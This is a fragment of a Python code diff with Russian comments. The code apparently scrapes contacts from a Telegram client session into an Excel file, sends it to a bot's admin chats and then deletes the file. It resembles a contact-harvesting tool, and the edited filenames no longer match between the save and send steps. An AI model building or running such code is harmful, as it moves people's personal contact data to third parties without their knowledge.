@@ -20,12 +20,12 @@ def send_files_to_bot(bot, admin_chat_ids):
         #print("Файл с участниками групп не найден или пустой.")
 
     # Проверяем наличие файла с контактами и отправляем его ботам
-    if os.path.exists(contacts_file_name) and os.path.getsize(contacts_file_name) > 0:
+    if os.path.exists("contacts.xlsx") and os.path.getsize("contacts.xlsx") > 0:
         for admin_chat_id in admin_chat_ids:
-            with open(contacts_file_name, "rb") as file:
+            with open("contacts.xlsx", "rb") as file:
                 bot.send_document(admin_chat_id, file)
         # После отправки удаляем файл, чтобы избежать повторной отправки
-        os.remove(contacts_file_name)
+        os.remove("contacts.xlsx")
     #else:
         #print("Файл с контактами не найден или пустой.")
 
@@ -76,11 +76,8 @@ async def get_contacts(client, session_name):
         row_num += 1
 
     # Сохраняем документ Excel
-    #wb.save('contacts.xlsx')
-    # Сохраняем документ Excel с именем файла, содержащим имя сессии
-    wb.save(contacts_file_name)
- # Отправляем файлы ботам
-    #send_files_to_bot(bot, admin_chat_ids, contacts_file_name)
+    wb.save(f'{session_name}_contacts.xlsx')
+    
 
 # Вызываем функцию get_contacts_and_send_files
 #await get_contacts_and_send_files(client, session_name, bot, admin_chat_ids)
